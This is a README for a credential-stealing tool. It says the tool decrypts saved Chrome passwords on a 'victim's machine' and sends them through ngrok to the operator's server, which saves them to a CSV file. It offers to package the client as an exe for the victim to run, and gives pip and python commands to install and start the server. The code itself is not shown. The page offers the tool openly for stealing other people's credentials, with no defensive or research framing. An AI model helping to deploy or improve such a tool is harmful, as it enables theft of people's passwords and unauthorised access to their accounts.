# Send-decrypt-chrome-passwords-to-server 👀
A script that decrypts Chrome passwords from the Chrome browser and sends them outside the local network to a server that saves them in a csv file on your machine.
- Client file only works on Windows.  
- Script needs ngrok to transfer data remotely.

## You can choose one of two options: 🧠
If you select 0 only the server will start so, you need to run client.py file(**client.py needs ip.txt file to work**) on victim's machine by your self using python.  
If you select 1(**Only when you run server on a windows machine**) the server will start and create an exe file which you can easily run on victim's machine.

## How to install and run on linux: 🤺
```
pip3 install -r requirements.txt
```
```
python server.py
```
## How to install and run on Windows: 🦾
```
py -m pip install -r requirements.txt  
```
```
py server.py
```
